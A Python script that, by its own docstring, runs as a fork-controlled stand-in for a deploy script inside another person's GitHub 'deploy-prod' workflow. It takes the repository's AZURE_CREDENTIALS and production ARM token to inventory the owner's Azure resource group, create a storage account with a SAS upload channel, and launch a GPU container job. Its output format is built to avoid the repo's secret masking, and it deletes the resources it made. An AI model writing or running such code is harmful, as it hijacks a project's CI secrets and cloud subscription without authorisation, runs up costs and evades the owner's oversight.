#!/usr/bin/env python3
"""C211-I121164: mslearn managed-container residual cleanup + ONE T4 device-capture retry.

Runs as the fork-controlled src/deploy_to_online_endpoint.py under the
christiansegercrantz/mslearn-mlops 'deploy-prod' issue_comment workflow
(environment prod, AZURE_CREDENTIALS -> ARM token for subscription 790067ff,
RG chriso-sandbox-rg).

Successor to i120856/i120956/i121089. Measured facts from x121089:
  * ACI V100 verbatim quota-refused (V100Cores Limit 0) westeurope+eastus,
    P100 GpuSkuNotSupportedInLocation southcentralus -> ACI branch closed.
  * Container Apps Consumption-GPU-NC8as-T4 env c211-i120856-cae reached
    provisioningState Succeeded and job c211-i120856-job + execution
    c211-i120856-job-nseyrap were created; the old probe read v.get('status')
    from the executions LIST (status actually lives under properties.status)
    so it recorded status=null for 47 polls, and its log endpoints 404'd.
  * Teardown: job_delete=202, env_delete=202, vnet_delete=400 while the env
    async delete was in flight, env_get=200 at DONE -> residual env+vnet.

This probe:
  1) reads the residual vnet c211-i120856-vnet / managedEnvironment
     c211-i120856-cae / job c211-i120856-job + executions verbatim first,
  2) retries the T4 device capture ONCE on the SAME env (or a new one if the
     residual is gone) with a nonce job c211-i121164-job running nvidia-smi,
     captures stdout through a private account-SAS blob channel (the mechanism
     i121088 proved works on a Consumption-GPU-NC8as-T4 profile) plus every
     documented log surface, with properties.status read correctly,
  3) tears down job(s) -> env -> storage -> vnet (with subnet fallback),
     proving absence with per-path 404 + list NO_RESULTS.

stdout is a flat tag|k=v format (no JSON braces: this repo's logs mask brace
runs because AZURE_CREDENTIALS contains JSON). Full bodies are base64.
stdlib only.
"""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
RG = "chriso-sandbox-rg"
TAG = "C211_I121164"
NONCE = "x121164mcl"
DEADLINE = 2700
T0 = time.time()

ACI_VER = "2026-07-01"
APP_VER = "2026-07-01"
STG_VER = "2023-01-01"
NET_VER = "2023-09-01"
IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
PROFILE = "Consumption-GPU-NC8as-T4"
SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"

ENV_OLD = "c211-i120856-cae"
ENV_NEW = "c211-i121164-cae"
JOB_OLD = "c211-i120856-job"
JOB_NEW = "c211-i121164-job"
VNET_OLD = "c211-i120856-vnet"
SUBNET_OLD = "c211-apps"
SA_NAME = ("c211i121164" + hashlib.sha256(NONCE.encode()).hexdigest()[:8]).lower()[:24]

UUID_RE = re.compile(r"GPU-[0-9a-fA-F-]{16,}")


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s


def emit(step, **kv):
    parts = [TAG, "step=" + clean(step)]
    for k, v in kv.items():
        parts.append("%s=%s" % (clean(k), clean(v)))
    print("|".join(parts), flush=True)


def b64(s):
    if not s:
        return ""
    return base64.b64encode(s.encode("utf-8", "replace")).decode()


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=300):
    t = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or "",
                "secs": round(time.time() - t, 1)}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e), "secs": round(time.time() - t, 1)}


def arm(tok, url, method="GET", body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:2000]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:2000]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()[:8000]
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()[:2000]
        except Exception:  # noqa: BLE001
            return e.code, b""
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()[:400]


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"), "message": (e.get("message") or "")[:900]}
        if "raw" in body:
            return {"http": st, "raw": body["raw"][:900]}
        return {"http": st, "body": json.dumps(body)[:900]}
    return {"http": st}


def errk(st, body):
    """err_of with non-colliding key names (for calls that already pass http=)."""
    d = err_of(st, body)
    return {"e_http": d.get("http"), "e_code": d.get("code"),
            "e_message": (d.get("message") or d.get("raw") or d.get("body") or "")[:900]}


def wait_gone(tok, url, label, tries=24, sleep_s=10):
    last = None
    for i in range(tries):
        st, b = arm(tok, url, timeout=60)
        ps = ((b.get("properties") or {}) if isinstance(b, dict) else {}).get("provisioningState")
        emit(label + "-absent-poll", i=i, http=st, state=ps)
        last = st
        if st == 404:
            return 404
        time.sleep(sleep_s)
    return last


def sa_sas(acct, key_b64, services="b", rt="co", perm="rwdlc", hours=3):
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, services, rt, st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": services, "srt": rt, "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


def main():
    sid = None
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_name=acc.get("name"), sub_id=sid, state=acc.get("state"),
             user_type=(acc.get("user") or {}).get("type"), tenant=acc.get("tenantId"),
             expect_match=(sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e), raw=r["out"][:200])
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit("arm-token", got=bool(tok), len=len(tok or ""))
    if not sid or not tok:
        emit("DONE", phase="fatal", verdict="NO_ARM_TOKEN", elapsed_s=int(time.time() - T0))
        return

    # ---------- 1) providers + inventory ----------
    prov = {}
    for ns in ("Microsoft.Storage", "Microsoft.App", "Microsoft.Network", "Microsoft.ContainerInstance"):
        st, b = arm(tok, f"{ARM}/subscriptions/{sid}/providers/{ns}?api-version=2021-04-01")
        state = (b.get("registrationState") if isinstance(b, dict) else None)
        prov[ns] = state
        emit("provider", ns=ns, http=st, registrationState=state)
    st, rl = arm(tok, f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/resources?api-version=2021-04-01",
                 timeout=120)
    allres = (rl.get("value") or []) if isinstance(rl, dict) else []
    mine = [{"name": x.get("name"), "type": x.get("type")} for x in allres
            if str(x.get("name", "")).lower().startswith("c211")]
    emit("rg-inventory", http=st, total=len(allres), c211_n=len(mine),
         c211_names=";".join("%s:%s" % (x["name"], x["type"]) for x in mine))

    # ---------- 2) residual reads VERBATIM ----------
    vneturl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.Network/"
               f"virtualNetworks/{VNET_OLD}?api-version={NET_VER}")
    st, vb = arm(tok, vneturl, timeout=60)
    vprops = (vb.get("properties") or {}) if isinstance(vb, dict) else {}
    vsubs = vprops.get("subnets") or []
    emit("residual-vnet", http=st, name=VNET_OLD,
         provisioningState=vprops.get("provisioningState"),
         addressPrefixes=";".join(vprops.get("addressSpace", {}).get("addressPrefixes") or []),
         subnets=";".join("%s:%s:deleg=%s" % (
             s.get("name"), (s.get("properties") or {}).get("addressPrefix"),
             ";".join((d.get("properties") or {}).get("serviceName", "")
                      for d in ((s.get("properties") or {}).get("delegations") or [])))
             for s in vsubs),
         **({} if st in (200, 404) else errk(st, vb)))

    envurl_old = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/"
                  f"managedEnvironments/{ENV_OLD}?api-version={APP_VER}")
    st, eb = arm(tok, envurl_old, timeout=60)
    eprops = (eb.get("properties") or {}) if isinstance(eb, dict) else {}
    alc = eprops.get("appLogsConfiguration") or {}
    la = (alc.get("logAnalyticsConfiguration") or {}) if isinstance(alc, dict) else {}
    emit("residual-env", http=st, name=ENV_OLD,
         provisioningState=eprops.get("provisioningState"),
         environmentMode=eprops.get("environmentMode"),
         logs_destination=alc.get("destination"), la_customerId=la.get("customerId"),
         defaultDomain=eprops.get("defaultDomain"),
         **({} if st in (200, 404) else errk(st, eb)))

    joburl_old = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/jobs/"
                  f"{JOB_OLD}?api-version={APP_VER}")
    st, jb = arm(tok, joburl_old, timeout=60)
    jprops = (jb.get("properties") or {}) if isinstance(jb, dict) else {}
    emit("residual-job", http=st, name=JOB_OLD, provisioningState=jprops.get("provisioningState"),
         runningState=jprops.get("runningState"),
         workloadProfileName=jprops.get("workloadProfileName"),
         **({} if st in (200, 404) else errk(st, jb)))
    if st == 200:
        st, ex = arm(tok, joburl_old.split("?")[0] + f"/executions?api-version={APP_VER}", timeout=60)
        vv = (ex.get("value") or []) if isinstance(ex, dict) else []
        for v in vv[:10]:
            p = v.get("properties") or {}
            emit("residual-execution", http=st, name=v.get("name"),
                 status=p.get("status"), reason=p.get("reason"),
                 startTime=p.get("startTime"), endTime=p.get("endTime"))
        emit("residual-executions-count", http=st, n=len(vv))

    # ---------- 3) storage account + SAS capture channel ----------
    sas = None
    saurl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/"
             f"Microsoft.Storage/storageAccounts/{SA_NAME}?api-version={STG_VER}")
    if prov.get("Microsoft.Storage") != "Registered":
        st, b = arm(tok, f"{ARM}/subscriptions/{sid}/providers/Microsoft.Storage/"
                         f"register?api-version=2021-04-01", method="POST", timeout=180)
        emit("storage-register", **err_of(st, b))
        time.sleep(6)
    sabody = {"location": "eastus", "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
              "tags": {"c211": "i121164", "nonce": NONCE},
              "properties": {"allowBlobPublicAccess": False, "minimumTlsVersion": "TLS1_2",
                             "supportsHttpsTrafficOnly": True,
                             "networkAcls": {"bypass": "AzureServices", "defaultAction": "Allow"}}}
    st, b = arm(tok, saurl, method="PUT", body=sabody, timeout=240)
    emit("sa-create", name=SA_NAME, **err_of(st, b))
    if st in (200, 201, 202):
        for i in range(24):
            stp, bp = arm(tok, saurl, timeout=60)
            ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
            emit("sa-poll", i=i, http=stp, state=ps)
            if ps == "Succeeded":
                break
            time.sleep(8)
        st, kb = arm(tok, f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/"
                          f"Microsoft.Storage/storageAccounts/{SA_NAME}/listKeys?api-version={STG_VER}",
                     method="POST", body={}, timeout=90)
        key = None
        try:
            key = (kb.get("keys") or [{}])[0].get("value")
        except Exception:  # noqa: BLE001
            pass
        emit("sa-keys", http=st, got=bool(key))
        if key:
            try:
                q, se = sa_sas(SA_NAME, key)
                base = f"https://{SA_NAME}.blob.core.windows.net"
                stc, bc = httptext(f"{base}/c211?restype=container&{q}", method="PUT")
                emit("sa-container", http=stc, body=b64(bc[:300].decode("utf-8", "replace")))
                if stc in (201, 409):
                    sas = f"{base}/c211/{NONCE}-out.txt?{q}"
                    emit("sa-sas", ok=True, blob=f"{base}/c211/{NONCE}-out.txt", expires=se)
            except Exception as e:  # noqa: BLE001
                emit("sa-sas", ok=False, err=str(e))

    # ---------- 4) environment: reuse residual, else create nonce env (no vnet) ----------
    envname = ENV_OLD
    envurl = envurl_old
    env_ok = False
    if eprops.get("provisioningState") == "Succeeded":
        env_ok = True
        emit("env-reuse", name=ENV_OLD, state="Succeeded")
    else:
        envname = ENV_NEW
        envurl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/"
                  f"managedEnvironments/{envname}?api-version={APP_VER}")
        envbody = {"location": "eastus", "tags": {"c211": "i121164", "nonce": NONCE},
                   "properties": {"workloadProfiles": [
                       {"name": "Consumption", "workloadProfileType": "Consumption"},
                       {"name": PROFILE, "workloadProfileType": PROFILE}]}}
        st, b = arm(tok, envurl, method="PUT", body=envbody, timeout=300)
        emit("capp-env-create", name=envname, profile=PROFILE, region="eastus", **err_of(st, b))
        if st in (200, 201):
            dl = time.time() + min(1200, max(240, left() - 700))
            ps = None
            while time.time() < dl:
                stp, bp = arm(tok, envurl, timeout=60)
                ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
                emit("capp-env-poll", http=stp, state=ps)
                if ps in ("Succeeded", "Failed", "Canceled"):
                    break
                time.sleep(25)
            env_ok = (ps == "Succeeded")
        if not env_ok:
            emit("env-not-ready", state="failed")
    if not env_ok:
        emit("DONE", phase="capp", verdict="ENV_NOT_AVAILABLE", elapsed_s=int(time.time() - T0))
        if envname == ENV_NEW:
            st, b = arm(tok, envurl, method="DELETE", timeout=300)
            emit("unready-env-delete", name=envname, **err_of(st, b))
            wait_gone(tok, envurl, "unready-env", tries=20, sleep_s=10)
        # still tear down residual vnet below
    else:
        st, env = arm(tok, envurl, timeout=60)
        env_id = env.get("id") if isinstance(env, dict) else None
        epp = (env.get("properties") or {}) if isinstance(env, dict) else {}
        emit("env-ready", name=envname, id_ok=bool(env_id),
             state=epp.get("provisioningState"),
             logs_destination=(epp.get("appLogsConfiguration") or {}).get("destination"))
        if not env_id:
            emit("DONE", phase="capp", verdict="NO_ENV_ID", elapsed_s=int(time.time() - T0))
        else:
            # ---------- 5) ONE nonce job execution: nvidia-smi + blob upload ----------
            inner = ('echo C211-START; hostname; date -u; '
                     'for p in /usr/local/nvidia/bin/nvidia-smi /usr/bin/nvidia-smi /bin/nvidia-smi; do '
                     'if [ -x "$p" ]; then echo FOUND=$p; "$p" -L; echo ---SMI-Q---; '
                     '"$p" --query-gpu=name,uuid,memory.total --format=csv,noheader; fi; done; '
                     'command -v nvidia-smi >/dev/null 2>&1 && nvidia-smi -L; '
                     'echo ---DEVS---; ls -l /dev/nvidia* 2>/dev/null; echo C211-END')
            cmd = f"OUT=/tmp/c211.txt; {{ {inner}; }} > $OUT 2>&1; cat $OUT; "
            if sas:
                up = ("if command -v curl >/dev/null 2>&1; then "
                      f"curl -sS -X PUT '{sas}' -H 'x-ms-blob-type: BlockBlob' "
                      "-H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' "
                      "--data-binary @$OUT; echo C211_UPLOAD_CURL_RC=$?; else "
                      "python3 -c \"import urllib.request;d=open('/tmp/c211.txt','rb').read();"
                      f"r=urllib.request.Request('{sas}',data=d,method='PUT',"
                      "headers={'x-ms-blob-type':'BlockBlob','x-ms-version':'2022-11-02',"
                      "'Content-Type':'text/plain'});print('C211_UPLOAD_PY',urllib.request.urlopen(r,timeout=30).status)\"; fi")
                cmd += up + "; "
            cmd += "echo C211_UPLOAD_DONE; sleep 20"
            joburl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/jobs/"
                      f"{JOB_NEW}?api-version={APP_VER}")
            jobbody = {"location": "eastus", "tags": {"c211": "i121164", "nonce": NONCE},
                       "properties": {"environmentId": env_id, "workloadProfileName": PROFILE,
                                      "configuration": {"triggerType": "Manual",
                                                        "replicaRetryLimit": 0,
                                                        "replicaTimeout": 1500,
                                                        "manualTriggerConfig": {
                                                            "replicaCompletionCount": 1,
                                                            "parallelism": 1}},
                                      "template": {"containers": [{
                                          "name": "gpu", "image": IMAGE,
                                          "command": ["/bin/bash", "-c", cmd],
                                          "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
            st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=180)
            emit("capp-job-create", name=JOB_NEW, **err_of(st, b))
            text = ""
            if st in (200, 201):
                baseurl = joburl.split("?")[0]
                st, b = arm(tok, f"{baseurl}/start?api-version={APP_VER}", method="POST",
                            body={}, timeout=120)
                emit("capp-job-start", http=st, execname=(b.get("name") if isinstance(b, dict) else None),
                     **({} if st in (200, 201, 202) else errk(st, b)))
                execname = (b.get("name") if isinstance(b, dict) else None)
                if execname:
                    exurl = f"{baseurl}/executions/{execname}?api-version={APP_VER}"
                    dl = time.time() + min(1300, max(360, left() - 700))
                    poll_i = 0
                    terminal_seen = False
                    while time.time() < dl:
                        stp, bp = arm(tok, exurl, timeout=60)
                        p = (bp.get("properties") or {}) if isinstance(bp, dict) else {}
                        status = p.get("status")
                        blobd = None
                        if sas:
                            sb, bb = httptext(sas, timeout=30)
                            if sb == 200 and bb:
                                blobd = bb.decode("utf-8", "replace")
                        logs = {}
                        if poll_i % 3 == 0 or (status in ("Succeeded", "Failed", "Canceled")):
                            for ver in ("2024-02-02-preview", "2023-05-01", APP_VER):
                                sl, bl = httptext(
                                    f"{baseurl}/executions/{execname}/containers/gpu/logs"
                                    f"?api-version={ver}", method="POST", timeout=30)
                                logs["P" + ver] = "%s:%s" % (sl, len(bl or b""))
                                if sl == 200 and bl and len(bl) > 2:
                                    txt = bl.decode("utf-8", "replace")
                                    if UUID_RE.search(txt):
                                        blobd = txt
                                sl2, bl2 = httptext(
                                    f"{baseurl}/executions/{execname}/containers/gpu/logs"
                                    f"?api-version={ver}", method="GET", timeout=30)
                                logs["G" + ver] = "%s:%s" % (sl2, len(bl2 or b""))
                            sl3, bl3 = httptext(f"{baseurl}/getlogs?api-version={APP_VER}",
                                                method="POST", timeout=30)
                            logs["getlogs"] = "%s:%s" % (sl3, len(bl3 or b""))
                        emit("capp-exec-poll", i=poll_i, http=stp, status=status,
                             reason=p.get("reason"), startTime=p.get("startTime"),
                             endTime=p.get("endTime"), blob_got=(blobd is not None),
                             blob_len=len(blobd or ""), logs=";".join("%s=%s" % (k, v)
                                                                      for k, v in logs.items()))
                        if blobd:
                            text = blobd
                            if "C211-END" in blobd:
                                break
                        if status in ("Succeeded", "Failed", "Canceled"):
                            if terminal_seen:
                                break
                            terminal_seen = True
                            time.sleep(10)
                        poll_i += 1
                        time.sleep(18)
                    emit("capp-capture", len=len(text or ""),
                         has_uuid=bool(UUID_RE.search(text or "")),
                         uuid_lines=";".join(ln for ln in (text or "").splitlines()
                                             if "GPU-" in ln)[:800],
                         text_b64=b64((text or "")[:6000]))
                else:
                    emit("capp-no-execution", http=st)
            # ---------- 6) teardown: job(s) -> env -> storage -> vnet ----------
            st, b = arm(tok, joburl, method="DELETE", timeout=240)
            emit("job-delete", name=JOB_NEW, **err_of(st, b))
            wait_gone(tok, joburl, "job", tries=24, sleep_s=10)
            stj, jj = arm(tok, joburl_old, timeout=60)
            if stj == 200:
                st, b = arm(tok, joburl_old, method="DELETE", timeout=240)
                emit("old-job-delete", name=JOB_OLD, **err_of(st, b))
                wait_gone(tok, joburl_old, "old-job", tries=24, sleep_s=10)
            else:
                emit("old-job-absent", name=JOB_OLD, http=stj)
            # delete the env we used (and the residual env if different)
            st, b = arm(tok, envurl, method="DELETE", timeout=300)
            emit("env-delete", name=envname, **err_of(st, b))
            wait_gone(tok, envurl, "env", tries=30, sleep_s=12)
            if envname != ENV_OLD:
                ste, ee = arm(tok, envurl_old, timeout=60)
                if ste == 200:
                    st, b = arm(tok, envurl_old, method="DELETE", timeout=300)
                    emit("old-env-delete", name=ENV_OLD, **err_of(st, b))
                    wait_gone(tok, envurl_old, "old-env", tries=30, sleep_s=12)
                else:
                    emit("old-env-absent", name=ENV_OLD, http=ste)
            if sas is not None:
                st, b = arm(tok, saurl, method="DELETE", timeout=240)
                emit("sa-delete", name=SA_NAME, **err_of(st, b))
                wait_gone(tok, saurl, "sa", tries=20, sleep_s=8)
    # ---------- 7) vnet cleanup retry AFTER the environment is terminal ----------
    st, vb = arm(tok, vneturl, timeout=60)
    emit("vnet-pre-delete", http=st,
         state=((vb.get("properties") or {}) if isinstance(vb, dict) else {}).get("provisioningState"))
    if st == 200:
        st, b = arm(tok, vneturl, method="DELETE", timeout=240)
        emit("vnet-delete", **err_of(st, b))
        if st not in (200, 202, 204):
            subneturl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.Network/"
                         f"virtualNetworks/{VNET_OLD}/subnets/{SUBNET_OLD}?api-version={NET_VER}")
            sts, bs = arm(tok, subneturl, method="DELETE", timeout=240)
            emit("subnet-delete", **err_of(sts, bs))
            time.sleep(10)
            st, b2 = arm(tok, vneturl, method="DELETE", timeout=240)
            emit("vnet-delete-retry", **err_of(st, b2))
        wait_gone(tok, vneturl, "vnet", tries=30, sleep_s=10)
    else:
        emit("vnet-already-absent", http=st)

    # ---------- 8) absence proof ----------
    st, rl = arm(tok, f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/resources?api-version=2021-04-01",
                 timeout=120)
    allres = (rl.get("value") or []) if isinstance(rl, dict) else []
    mine = [{"name": x.get("name"), "type": x.get("type")} for x in allres
            if str(x.get("name", "")).lower().startswith("c211")]
    emit("rg-final", http=st, total=len(allres),
         c211_left=("NO_RESULTS" if not mine else ";".join("%s:%s" % (x["name"], x["type"])
                                                          for x in mine)))
    for label, path, ver in (
            ("jobs", f"/subscriptions/{sid}/providers/Microsoft.App/jobs", APP_VER),
            ("envs", f"/subscriptions/{sid}/providers/Microsoft.App/managedEnvironments", APP_VER),
            ("vnets", f"/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.Network/"
                      f"virtualNetworks", NET_VER),
            ("aci", f"/subscriptions/{sid}/providers/Microsoft.ContainerInstance/containerGroups", ACI_VER)):
        st, lst = arm(tok, f"{ARM}{path}?api-version={ver}", timeout=120)
        names = [x.get("name") for x in ((lst.get("value") or []) if isinstance(lst, dict) else [])
                 if str(x.get("name", "")).lower().startswith("c211")]
        emit("list-" + label, http=st,
             n_total=len(((lst.get("value") or []) if isinstance(lst, dict) else [])),
             c211=("NO_RESULTS" if not names else ";".join(names)))
    for label, u in (("vnet", vneturl), ("env-old", envurl_old), ("job-old", joburl_old)):
        st, _ = arm(tok, u, timeout=60)
        emit("final-get-" + label, http=st)
    emit("DONE", phase="capp", elapsed_s=int(time.time() - T0))


if __name__ == "__main__":
    main()
